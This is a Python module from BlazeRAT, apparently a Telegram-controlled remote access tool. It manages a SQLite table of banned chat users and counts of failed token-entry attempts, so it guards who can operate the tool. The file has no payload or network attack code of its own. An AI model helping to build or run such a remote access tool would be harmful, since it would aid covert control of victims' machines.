#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed to block users
    and changes in the number of attempts to enter the token.
"""

# Import modules
from core.database import connection, cursor, lock

""" Change user attempts """
def SetAttempts(chatid: int, username: str = "Unknown", attempts: int = 5) -> str:
    lock.acquire(True)
    sql = "SELECT id FROM banned WHERE chatid=?"
    cursor.execute(sql, (chatid,))
    # Change attempts count to user
    result = cursor.fetchone()
    if result is not None:
        sql = "UPDATE banned SET attempts=?, username=? WHERE chatid=?"
    else:
        sql = "INSERT INTO banned (attempts, username, chatid) VALUES (?, ?, ?)"
    # Execute sql & commit changes
    cursor.execute(sql, (attempts, username, chatid))
    connection.commit()
    lock.release()
    return sql[:6]

""" Change user ban state """
def BanUser(chatid: int, username: str = "Unknown", state: bool = True, reason: str = "") -> None:
    lock.acquire(True)
    sql = "SELECT id FROM banned WHERE chatid=?"
    cursor.execute(sql, (chatid,))
    # Change ban state to user
    result = cursor.fetchone()
    if result is not None:
        sql = "UPDATE banned SET state=?, username=?, reason=? WHERE chatid=?"
    else:
        sql = "INSERT INTO banned (state, username, reason, chatid) VALUES (?, ?, ?, ?)"
    # Set user is banned
    cursor.execute(sql, (int(state), username, reason, chatid))
    # Remove row from authorized users
    if state is True:
        sql = "DELETE FROM authorized WHERE chatid=?"
        cursor.execute(sql, (chatid,))
    connection.commit()
    lock.release()


""" Get user attempts count """
def GetAttempts(chatid: int) -> int:
    sql = "SELECT attempts FROM banned WHERE chatid=?"
    cursor.execute(sql, (chatid,))
    result = cursor.fetchone()
    if result is not None:
        return int(result[0])
    else:
        return 5

""" User is banned """
def UserIsBanned(chatid: int) -> tuple:
    sql = "SELECT state, reason FROM banned WHERE chatid=?"
    cursor.execute(sql, (chatid,))
    result = cursor.fetchone()
    if result is not None:
        return bool(result[0]), result[1]
    else:
        return False, "User not found"


""" Get banned users list """
def EnumerateBannedUsers() -> str:
    result = "Banned users list\n"
    sql = "SELECT chatid, username, reason FROM banned WHERE state=1 OR attempts=0"
    cursor.execute(sql)
    users = cursor.fetchall()
    # No banned users
    if len(users) == 0:
        return "There is no banned users"
    # Enum
    for user in users:
        chatid = user[0]
        username = user[1]
        reason = user[2]

        result += f"CHATID: {chatid},\nREASON: {reason},\nUSERNAME: {username}\n\n"

    return result
